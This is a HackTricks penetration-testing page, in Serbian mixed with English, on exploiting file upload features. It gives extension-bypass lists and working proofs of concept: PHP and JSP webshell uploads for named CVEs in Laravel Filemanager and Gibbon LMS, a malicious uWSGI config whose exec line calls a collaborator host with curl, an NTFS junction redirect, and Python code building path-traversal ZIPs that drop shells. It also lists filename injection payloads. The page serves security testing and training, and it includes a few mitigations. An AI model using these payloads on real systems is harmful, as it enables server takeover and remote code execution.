# Otpremanje fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija otpremanja fajlova

Ostale korisne ekstenzije:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provere ekstenzija fajlova

1. Ako se primenjuje, **proverite** prethodno navedene **ekstenzije.** Takođe testirajte koristeći neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanje validne ekstenzije pre** ekstenzije za izvršavanje (koristite i prethodno navedene ekstenzije):_
- _file.png.php_
- _file.png.Php5_
3. Pokušajte dodati **specijalne karaktere na kraju.** Možete koristiti Burp da **bruteforce**-ujete sve **ascii** i **Unicode** karaktere. (_Napomena: takođe možete pokušati da koristite ranije pomenute ekstenzije_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Pokušajte zaobići zaštite **varajući parser ekstenzija** na serverskoj strani tehnikama kao što su **dupliranje** **ekstenzije** ili **dodavanje junk** podataka (**null** bajtova) između ekstenzija. _Takođe možete koristiti prethodne ekstenzije da pripremite bolji payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodajte **još jedan sloj ekstenzija** prethodnoj proveri:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Pokušajte da stavite **ekstenziju za izvršavanje pre validne ekstenzije** i nadate se da je server pogrešno konfigurisan. (korisno za iskorišćavanje Apache miskonfiguracija gde će bilo šta sa ekstenzijom **_.php_**, ali ne nužno završeno sa .php, izvršiti kod):
- _ex: file.php.png_
7. Korišćenje **NTFS alternate data stream (ADS)** u **Windows**. U tom slučaju, karakter dvojne tačke ":" će biti ubačen posle zabranjene ekstenzije i pre dozvoljene. Kao rezultat, na serveru će biti kreiran **prazan fajl sa zabranjenom ekstenzijom** (npr. "file.asax:.jpg”). Ovaj fajl može kasnije biti izmenjen drugim tehnikama, kao što je korišćenje njegovog short filename. Pattern "**::$data**” se takođe može koristiti za kreiranje ne-praznih fajlova. Dakle, dodavanje tačke nakon ovog patterna može takođe biti korisno za zaobilaženje daljih ograničenja (npr. "file.asp::$data.”)
8. Pokušajte da prekoračite limit imena fajla. Validna ekstenzija bude isečena. A maliciozni PHP ostane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Neki upload handleri skraćuju ili normalizuju trailing tačke iz sačuvanog imena fajla. U UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) verzijama pre 2.9.1, možete zaobići validaciju ekstenzije koristeći:

- Korišćenje validnog image MIME i magic header-a (npr. PNG’s `\x89PNG\r\n\x1a\n`).
- Imenovanje uploadovanog fajla sa PHP ekstenzijom praćenom tačkom, npr. `shell.php.`.
- Server uklanja trailing tačku i sačuva `shell.php`, koji će se izvršiti ako je postavljen u direktorijum koji je serviran web-om (podrazumevana public storage lokacija kao što je `/storage/files/`).

Minimalni PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Zatim pristupite sačuvanoj putanji (tipično u Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Zaobiđite provere **Content-Type** tako što ćete postaviti **vrednost** **Content-Type** **header**-a na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Zaobiđite proveru **magic number** tako što ćete na početak fajla dodati **bajtove prave slike** (zbunite _file_ komandu). Ili ubacite shell u **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ako se na vašu sliku primenjuje **kompresija**, na primer korišćenjem standardnih PHP biblioteka kao što je [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike neće biti korisne. Međutim, možete koristiti **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web stranica takođe može **promenjivati veličinu** **slike**, koristeći na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Međutim, možete koristiti **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Još jedna tehnika za pravljenje payload-a koji **preživi promenu veličine slike**, koristeći PHP-GD funkciju `thumbnailImage`. Međutim, možete koristiti **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Pronađite ranjivost koja omogućava **rename** već otpremljenog fajla (da promenite ekstenziju).
- Pronađite ranjivost **Local File Inclusion** da izvršite backdoor.
- **Moguće otkrivanje informacija**:
1. Otpremite **više puta** (i u **isto vreme**) **isti fajl** sa **istim imenom**
2. Otpremite fajl sa **imenom** fajla ili **foldera** koji **već postoji**
3. Otpremanje fajla sa **"." , "..", or "…" as its name**. For instance, in Apache in **Windows**, if the application saves the uploaded files in "/www/uploads/" directory, the "." filename will create a file called
uploads” in the "/www/" directory.
4. Otpremite fajl koji možda ne može lako da se obriše, kao što je **"…:.jpg"** u **NTFS**. (Windows)
5. Otpremite fajl u **Windows** sa **nevažećim karakterima** kao što su `|<>*?”` u imenu. (Windows)
6. Otpremite fajl u **Windows** koristeći **reserved** (**forbidden**) **names** kao što su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Takođe pokušajte da **otpremite izvršni fajl** (.exe) ili **.html** (manje sumnjivo) koji će **izvršiti kod** kada ga žrtva slučajno otvori.

### Special extension tricks

Ako pokušavate da otpremite fajlove na **PHP server**, [pogledajte **.htaccess** trik za izvršavanje koda](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ako pokušavate da otpremite fajlove na **ASP server**, [pogledajte **.config** trik za izvršavanje koda](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Fajlovi `.phar` su kao `.jar` za java, ali za php, i mogu biti **used like a php file** (executing it with php, or including it inside a script...)

Ekstenzija `.inc` se ponekad koristi za php fajlove koji služe samo za **import files**, tako da je moguće da je negde dozvoljeno **da se ova ekstenzija izvršava**.

## **Jetty RCE**

Ako možete da otpremite XML fajl na Jetty server, možete dobiti [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao što je pomenuto na sledećoj slici, otpremite XML fajl u `$JETTY_BASE/webapps/` i očekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Za detaljnu analizu ove ranjivosti pogledajte originalno istraživanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Ranjivosti Remote Command Execution (RCE) mogu se iskoristiti na uWSGI serverima ako napadač ima mogućnost da izmeni `.ini` konfiguracioni fajl. uWSGI konfiguracioni fajlovi koriste specifičnu sintaksu za uključivanje "magic" promenljivih, placeholder-a i operatora. Posebno, '@' operator, korišćen kao `@(filename)`, namenjen je da uključi sadržaj fajla. Među različitim podržanim schemes u uWSGI, "exec" scheme je posebno moćna, omogućavajući čitanje podataka iz standardnog izlaza procesa. Ova funkcionalnost se može iskoristiti u zlonamerne svrhe kao što su Remote Command Execution ili Arbitrary File Write/Read kada se obrađuje `.ini` konfiguracioni fajl.

Razmotrite sledeći primer zlonamernog `uwsgi.ini` fajla, koji prikazuje različite schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršavanje payload-a se dešava tokom parsiranja konfiguracione datoteke. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti restartovan (potencijalno nakon pada ili zbog Denial of Service napada) ili datoteka mora biti podešena na auto-reload. Funkcija auto-reload, ukoliko je omogućena, ponovo učitava datoteku u zadatim intervalima kada detektuje promene.

Ključno je razumeti opuštenu prirodu parsiranja konfiguracione datoteke uWSGI-a. Konkretno, pomenuti payload može biti ubačen u binarnu datoteku (kao što je slika ili PDF), čime se dodatno proširuje obim mogućeg iskorišćavanja.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Metod: POST
- Potrebni parametri:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignoriše type/name, base64-dekodira ostatak)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: bilo koja vrednost koja nije prazna je prihvaćena (npr., `0000000001`)

Minimalni PoC za upis i ponovno čitanje fajla:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Postavite minimalni webshell i izvršavajte komande:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Napomene:
- Handler izvršava `base64_decode($_POST["img"])` nakon splitovanja po `;` i `,`, zatim upisuje bajtove u `$absolutePath . '/' . $_POST['path']` bez validacije ekstenzije/tipa.
- Posledični kod se izvršava kao korisnik web servisa (npr. XAMPP Apache na Windows).

Reference za ovaj bug uključuju usd HeroLab advisory i NVD entry. Pogledajte sekciju References ispod.

## **wget File Upload/SSRF Trick**

Ponekad možete naići na server koji koristi **`wget`** za **download files** i možete **indicate** the **URL**. U tim slučajevima, kod može proveravati da li je ekstenzija preuzetih fajlova na whitelist-i kako bi osigurao da će biti preuzeti samo dozvoljeni fajlovi. Međutim, **this check can be bypassed.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### Izlazak iz direktorijuma za upload putem NTFS junctions (Windows)

(For this attack you will need local access to the Windows machine) Kada se uploadi čuvaju u po-korisničkim podfolderima na Windowsu (npr., C:\Windows\Tasks\Uploads\<id>\) i vi kontrolišete kreiranje/brisanje tog podfoldera, možete ga zameniti directory junction-om koji pokazuje na osetljivu lokaciju (npr., the webroot). Naknadni uploadi biće upisani u ciljnu putanju, što omogućava izvršavanje koda ako cilj interpretira kod na serverskoj strani.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J creates an NTFS directory junction (reparse point). The web server’s account must follow the junction and have write permission in the destination.
- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
- Defenses: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Neki upload/ingest handler-i upisuju raw request body na filesystem putanju koja je konstruisana iz query parametara pod kontrolom korisnika. Ako handler takođe podržava Content-Encoding: gzip i ne canonicalizuje/validira destinacijsku putanju, možete kombinovati directory traversal sa gzipped payload-om da upišete proizvoljne bajtove u direktorijum koji služi web i dobijete RCE (npr. ubacivanjem JSP-a u Tomcat-ov webapps).

Generic exploitation flow:
- Prepare your server-side payload (e.g., minimal JSP webshell) and gzip-compress the bytes.
- Send a POST where a path parameter (e.g., token) contains traversal escaping the intended folder, and file indicates the filename to persist. Set Content-Type: application/octet-stream and Content-Encoding: gzip; the body is the compressed payload.
- Browse to the written file to trigger execution.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Zatim pokreni:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notes
- Ciljni putevi variraju po instalaciji (npr. /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ u nekim stack-ovima). Bilo koji web-izloženi folder koji izvršava JSP će raditi.
- Burp Suite’s Hackvertor extension može proizvesti ispravan gzip body iz vašeg payload-a.
- Ovo je čisti pre-auth arbitrary file write → RCE obrazac; ne oslanja se na multipart parsing.

Mitigations
- Izvodite destinacije za upload na serverskoj strani; nikada ne verujte fragmentima putanje koje šalju klijenti.
- Kanonicalizujte i primorajte da rešeni put ostane unutar dozvoljenog (allow-listed) osnovnog direktorijuma.
- Skladištite upload-ovane fajlove na neizvršnom volumenu i zabranite izvršavanje skripti iz upisnih putanja.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) je moćan alat dizajniran da asistira Pentesters and Bug Hunters u testiranju file upload mehanizama. Koristi razne bug bounty tehnike da pojednostavi proces identifikacije i eksploatacije ranjivosti, omogućavajući temeljne procene web aplikacija.

### Corrupting upload indices with snprintf quirks (historical)

Neki legacy upload handler-i koji koriste `snprintf()` ili slične funkcije za građenje multi-file nizova iz single-file uploada mogu biti prevareni da falsifikuju strukturu `_FILES`. Zbog nekonzistentnosti i truncation u ponašanju `snprintf()`, pažljivo konstruisan single upload može izgledati kao više indeksiranih fajlova na serverskoj strani, zbunjujući logiku koja pretpostavlja strogi oblik (npr. tretira ga kao multi-file upload i uzima nesigurne grane). Iako danas retko, ovaj pattern “index corruption” povremeno se pojavljuje u CTF-ovima i starijim kodbazama.

## From File upload to other vulnerabilities

- Postavite **filename** na `../../../tmp/lol.png` i pokušajte da postignete **path traversal**
- Postavite **filename** na `sleep(10)-- -.jpg` i možda ćete moći da postignete **SQL injection**
- Postavite **filename** na `<svg onload=alert(document.domain)>` da postignete **XSS**
- Postavite **filename** na `; sleep 10;` da testirate neku **command injection** (više [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probajte **različite svg payload-e** sa [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Ako možete navesti web server da preuzme image sa URL-a, možete pokušati da zloupotrebite [SSRF](../ssrf-server-side-request-forgery/index.html). Ako će ta **image** biti **sacuvana** na nekom **public** sajtu, možete takođe navesti URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukrasti informacije svakog posetioca**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Posebno crafted PDF-ovi za XSS: Sledeća stranica prikazuje kako **inject PDF data to obtain JS execution** (../xss-cross-site-scripting/pdf-injection.md). Ako možete upload-ovati PDF-ove, možete pripremiti PDF koji će izvršiti arbitrarni JS prateći date instrukcije.
- Otpremite sadržaj \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) da proverite da li server ima neki **antivirus**
- Proverite da li postoji neka **size limit** pri uploadovanju fajlova

Evo top 10 liste stvari koje možete postići upload-ovanjem (preuzeto [ovde](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Pogledajte [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) za ostale tipove fajlova.

## Zip/Tar File Automatically decompressed Upload

Ako možete upload-ovati ZIP koji će biti dekompresovan na serveru, možete uraditi 2 stvari:

### Symlink

Otpremite arhivu koja sadrži soft linkove ka drugim fajlovima; zatim, pristupanjem dekompresovanim fajlovima pristupićete povezanim fajlovima:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. Uprkos početnim pretpostavkama da ova postavka može štititi od OS-level command execution putem zlonamernih upload-ovanih fajlova, hijerarhijska podrška kompresije i mogućnosti directory traversal u ZIP formatu arhive mogu se zloupotrebiti. Ovo omogućava napadačima da zaobiđu ograničenja i pobegnu iz bezbednih direktorijuma za upload manipulisanjem funkcionalnošću dekompresije ciljane aplikacije.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se može koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Takođe, **symlink trick with evilarc** je opcija. Ako je cilj da se targetira fajl poput `/flag.txt`, treba kreirati symlink ka tom fajlu na vašem sistemu. Ovo osigurava da evilarc ne nailazi na greške tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje malicioznog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za file spraying**

Za više detalja **pogledajte originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kod je napisan da izvršava komande prosleđene kroz `$_REQUEST` promenljivu.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Kreira se više fajlova i sastavlja zip arhiva koja sadrži te fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Imena fajlova unutar zip-a se menjaju koristeći vi ili hex editor, menjajući "xxA" u "../" za prelazak u roditeljske direktorijume.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Kada backend validira ZIP entry-je koristeći PHP‑ov ZipArchive, ali ekstrakcija zapisuje na fajl sistem koristeći neobrađena imena, možete prošvercovati nedozvoljenu ekstenziju ubacivanjem NUL (0x00) u polja imena fajla. ZipArchive tretira ime entry-ja kao C‑string i prekida na prvom NUL‑u; fajl sistem zapisuje puno ime, zanemarujući sve nakon NUL‑a.

Opšti tok:
- Pripremite legitimni container fajl (npr. validan PDF) koji u stream‑u ubacuje mali PHP stub tako da magic/MIME ostane PDF.
- Nazovite ga npr. `shell.php..pdf`, zipujte ga, zatim hex‑editujte ZIP local header i central directory filename da zamenite prvi `.` posle `.php` sa `0x00`, što rezultuje `shell.php\x00.pdf`.
- Validatori koji se oslanjaju na ZipArchive će “videti” `shell.php .pdf` i dozvoliti ga; ekstraktor će zapisati `shell.php` na disk, što vodi do RCE ukoliko je upload folder izvršan.

Minimalni PoC koraci:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Napomene
- Promenite OBA pojavljivanja imena fajla (local i central directory). Neki alati dodaju i dodatni data descriptor entry – prilagodite sva polja imena ako su prisutna.
- Payload fajl mora i dalje proći server‑side magic/MIME sniffing. Ugradnja PHP-a u PDF stream održava header validnim.
- Radi u situacijama gde enum/validation putanja i extraction/write putanja ne slažu u rukovanju stringovima.

### Stacked/concatenated ZIPs (parser disagreement)

Konkatenacija dva validna ZIP fajla stvara blob gde se različiti parseri fokusiraju na različite EOCD zapise. Mnogi alati lociraju poslednji End Of Central Directory (EOCD), dok neke biblioteke (npr. ZipArchive u specifičnim workflow-ima) mogu parsirati prvu arhivu koju pronađu. Ako validacija enumeriše prvu arhivu, a ekstrakcija koristi drugi alat koji uvažava poslednji EOCD, benigna arhiva može proći provere dok se zlonamerna ekstrahuje.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Način zloupotrebe
